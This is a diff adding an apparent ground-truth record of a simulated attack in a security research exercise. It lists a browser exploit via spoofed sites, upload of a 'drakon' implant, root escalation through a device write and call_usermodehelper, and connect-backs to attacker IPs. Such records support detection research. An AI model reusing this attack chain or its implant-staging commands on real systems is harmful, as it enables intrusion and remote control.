@@ -1,0 +1,116 @@
+date: "20180410"
+start_time: "13:41"
+end_time: "14:55"
+search_terms:
+  - "www.allstate.com"
+  - "system locked up"
+  - "ps -aux"
+  - "grep firefox"
+  - "firefox"
+  - "sudo kill -9 5771"
+  - "www.gatech.edu"
+  - "drakon"
+  - "/var/log/xdev"
+  - "145.199.103.57"
+  - "61.130.69.232"
+  - "128.55.12.167"
+  - "5.214.163.155"
+  - "161.116.88.72"
+  - "146.153.68.151"
+  - "104.228.117.212"
+  - "141.43.176.203"
+  - "7.149.198.40"
+  - "webserver"
+  - "www.allstate.com"
+  - "shellcode_server"
+  - "libdrakon.linux.x64.so drakon.linux.x64"
+  - "loaderDrakon.linux.x64"
+  - "netrecon"
+  - "./deploy/archive/drakon.linux.x64_161.116.88.72"
+  - "rm clean"
+  - "clean"
+  - "./deploy/archive/drakon.linux.x64_161.116.88.72"
+  - "/home/admin/profile"
+  - "rm profile"
+  - "./deploy/archive/libdrakon.linux.x64.so_5.214.163.155"
+  - "xdev"
+  - "/home/admin/clean"
+  - "/home/admin/profile"
+  - "nrtcp"
+  - "http://wwww.git.edu"
+  - "whoami"
+  - "/dev/gtx_alsa_675"
+  - "call_usermodehelper"
+
+#Frist Attack of 3rd Track from Cadets Eng3
+
+# "Event Log:"
+    #  09:58 THEIA is unreachable, going to restart
+    #  13:41 www.allstate.com crash
+    #  13:41 www.allstate.com crash
+    #  13:41 www.allstate.com crash
+    #  13:41 Failed 3/4 times, firefox crashed, system locked up
+    #  admin@ta1-theia-target:~$ ps -aux | grep firefox
+    #  admin@ta1-theia-target:~$ sudo kill -9 5771
+    #  14:31 www.gatech.edu
+    #  14:31 Shell from THEIA
+    #  14:35 putfile clean
+    #  14:35 elevate clean
+    #  14:35 quit
+    #  14:35 connect back
+    #  14:51 drakon (clean as root) stopped responding
+    #  14:51 lost connection to TRACE when OC crashed
+    #  14:55 re-exploit gatech.edu
+    #  14:55 putfile profile
+    #  putfile /var/log/xdev
+    #  Left connection L5 in OC2 open
+# "Adresses:" 
+    #  [eth0:890] 145.199.103.57:80 -> 128.55.12.167:8010
+    #  [eth0:891] 61.130.69.232:80 -> 128.55.12.167:8011
+    # (www.allstate.com)
+    #  [eth0:894] 5.214.163.155:80 -> 128.55.12.167:8014
+    #  [eth0:896] 161.116.88.72:80 -> 128.55.12.167:8016
+    #  [eth0:897] 146.153.68.151:80 -> 128.55.12.167:8017
+    #  [eth0:898] 104.228.117.212:80 -> 128.55.12.167:8018
+    #  [eth0:899] 141.43.176.203:80 -> 128.55.12.167:8019
+    # (www.gatech.edu)
+    #  [eth0:908] 7.149.198.40:80 -> 128.55.12.167:8028
+    # webserver (www.allstate.com) shellcode_server
+    # libdrakon.linux.x64.so drakon.linux.x64
+    # loaderDrakon.linux.x64 webserver (www.gatech.edu)
+    # shellcode_server
+    # netrecon (www.gatech.edu)
+# "Interactions:"
+#     "Files:"
+        #  L4>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 clean
+        #  L4>rm clean
+        #  L1>putfile ./deploy/archive/drakon.linux.x64_161.116.88.72 /home/admin/profile
+        #  rm profile
+        #  L2>putfile ./deploy/archive/libdrakon.linux.x64.so_5.214.163.155 xdev
+#     "Processes:"
+        #  L4>elevate /home/admin/clean
+        #  L1>elevate /home/admin/profile
+#     "Connections:"
+        #  exploit: www.allstate.com 145.199.103.57:80
+        #  firefox: connection to 61.130.69.232:80 (firefox crash?)
+        #  exploit: www.gatech.edu 104.228.117.212:80
+        #  firefox: connection to 141.43.176.203:80
+        #  firefox: connection to 146.153.68.151:80
+        #  profile: connection to 161.116.88.72:80
+        #  L2>nrtcp 7.149.198.40 80
+# "Graph:"
+# firefox connect (stage 1) 141.43.176.203:80
+# firefox connect (exploit) 104.228.117.212:80
+# firefox browse http://wwww.git.edu
+# firefox call quit
+# firefox call ps
+# firefox call hostname
+# firefox connect (oc2) 146.153.68.151:80
+# firefox call whoami
+# firefox delete /home/admin/clean
+# firefox putfile /home/admin/clean
+# firefox write (cmd_exec, clean) /dev/gtx_alsa_675
+# /dev/gtx_alsa_675 execute (call_usermodehelper) /home/admin/clean
+# /home/admin/clean new process (root) clean (PID ?)
+# clean (PID ?) connect (oc2) 161.116.88.72:80
+# 2nd graph is unreadable 
